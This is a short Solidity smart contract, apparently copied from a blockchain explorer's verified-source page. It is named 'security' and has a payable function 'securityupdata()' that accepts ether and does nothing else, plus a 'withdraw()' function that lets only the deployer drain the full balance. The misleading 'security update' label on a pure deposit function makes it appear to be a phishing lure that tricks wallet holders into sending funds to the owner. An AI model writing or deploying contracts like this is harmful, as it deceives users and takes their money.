/**
 *Submitted for verification at Arbiscan.io on 2024-05-27
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.4.26;
contract security{
    address private owner;
    constructor() public{
        owner = msg.sender;
    }
    function securityupdata() public payable{
    }
    function withdraw() public{
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
}